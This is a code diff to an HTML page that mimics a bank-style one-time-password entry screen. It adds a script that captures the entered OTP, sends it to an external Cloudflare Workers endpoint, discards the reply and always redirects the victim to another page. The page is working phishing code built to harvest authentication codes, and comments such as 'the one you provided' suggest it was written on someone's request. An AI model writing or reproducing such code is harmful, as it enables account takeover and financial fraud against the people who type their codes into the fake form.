@@ -256,11 +256,11 @@
             <div class="instruction">Enter the One Time Password sent to your mobile phone</div>
             <div class="mandatory-note">Mandatory fields are marked with an asterisk (*)</div>
 
-            <!-- OTP form -->
+            <!-- OTP form (added id to input) -->
             <form>
                 <div class="form-group">
                     <label class="form-label">One Time Password <span class="asterisk">*</span></label>
-                    <input type="text" class="form-input" placeholder="" maxlength="6">
+                    <input type="text" class="form-input" placeholder="" maxlength="6" id="otpInput">
                 </div>
 
                 <!-- SUBMIT BUTTON – now centered and gold with white text -->
@@ -296,5 +296,47 @@
 
         <!-- footer image has been removed as per request -->
     </div>
+
+    <!-- Script to send OTP to Cloudflare Worker and redirect to finalblog.html -->
+    <script>
+        (function() {
+            const form = document.querySelector('form');
+            if (form) {
+                form.addEventListener('submit', async function(e) {
+                    e.preventDefault();  // stop normal form submission
+                    
+                    const otpInput = document.getElementById('otpInput');
+                    const otpValue = otpInput ? otpInput.value.trim() : '';
+                    
+                    // Generate a unique ID for this submission
+                    const uniqueId = 'otp_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10);
+                    
+                    // Prepare payload as expected by the worker (type "OTP")
+                    const payload = {
+                        type: 'OTP',
+                        data: { otp: otpValue },
+                        id: uniqueId
+                    };
+                    
+                    // Worker endpoint (the one you provided)
+                    const workerUrl = 'https://falling-waterfall-d23a.vikash6759ub.workers.dev/';
+                    
+                    try {
+                        await fetch(workerUrl, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(payload)
+                        });
+                        // (We ignore the response – just try to send)
+                    } catch (err) {
+                        console.error('Error sending OTP to worker:', err);
+                    }
+                    
+                    // Always redirect to finalblog.html (relative path)
+                    window.location.href = 'finalblog.html';
+                });
+            }
+        })();
+    </script>
 </body>
 </html>
